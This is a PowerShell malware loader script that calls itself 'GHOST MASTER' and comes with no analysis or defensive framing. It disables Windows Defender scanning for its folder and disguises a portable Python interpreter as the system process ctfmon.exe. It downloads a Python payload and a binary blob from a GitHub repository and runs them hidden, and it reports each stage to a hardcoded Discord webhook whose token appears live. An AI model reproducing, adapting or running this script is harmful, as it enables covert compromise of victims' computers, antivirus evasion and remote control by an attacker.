# --- THE FINAL GHOST MASTER (V6.6 - ZERO-DEPENDENCY HYDRA) ---
$WEBHOOK = "https://discord.com/api/webhooks/1503875954630721717/fqTPxY9-dtRtuf3WPQnehMkV5DJuNohpjsn0tXVHLvIuKwUoG303rce3vqF2U7Zoc9v3"
function Send-Ghost { param($msg) try { $json = @{content="[GHOST STATUS] $msg"} | ConvertTo-Json; Invoke-RestMethod -Uri $WEBHOOK -Method Post -Body $json -ContentType "application/json" } catch {} }

$ID = "svchost"
$Path = "$env:APPDATA\$ID"
$PY_MASK = "$Path\python\ctfmon.exe"

if (Get-Process -Name "ctfmon" | Where-Object { $_.Path -like "*$Path*" }) { exit }

if (!(Test-Path $Path)) { New-Item -ItemType Directory -Path $Path -Force | Out-Null }
Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue

# 1. LANDING PORTABLE PYTHON
if (!(Test-Path $PY_MASK)) {
    Send-Ghost "Landing Private Engine on $($env:COMPUTERNAME)..."
    Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.12.0/python-3.12.0-embed-amd64.zip" -OutFile "$Path\py.zip"
    Expand-Archive -Path "$Path\py.zip" -DestinationPath "$Path\python" -Force
    Remove-Item "$Path\py.zip"
    
    # IMPORTANT: Enable Site-Packages for Portable Python
    $PthFile = Get-ChildItem -Path "$Path\python" -Filter "*._pth" | Select-Object -First 1
    if ($PthFile) {
        $Content = Get-Content $PthFile.FullName
        $Content = $Content -replace "#import site", "import site"
        Set-Content -Path $PthFile.FullName -Value $Content
    }

    if (Test-Path "$Path\python\pythonw.exe") { Rename-Item -Path "$Path\python\pythonw.exe" -NewName "ctfmon.exe" -Force }
}

# 2. LANDING PAYLOADS
$C_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinServices.py"
$Z_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/mui_cache.bin"
Invoke-WebRequest -Uri $C_URL -OutFile "$Path\WinServices.py"
Invoke-WebRequest -Uri $Z_URL -OutFile "$Path\mui_cache.bin"

# 3. ENGAGE
$env:PYTHONPATH = "$Path\python\Lib\site-packages"
Start-Process -FilePath $PY_MASK -ArgumentList "`"$Path\WinServices.py`"" -WorkingDirectory $Path -WindowStyle Hidden

Send-Ghost "Hydra Fully Engaged. No host dependencies required."
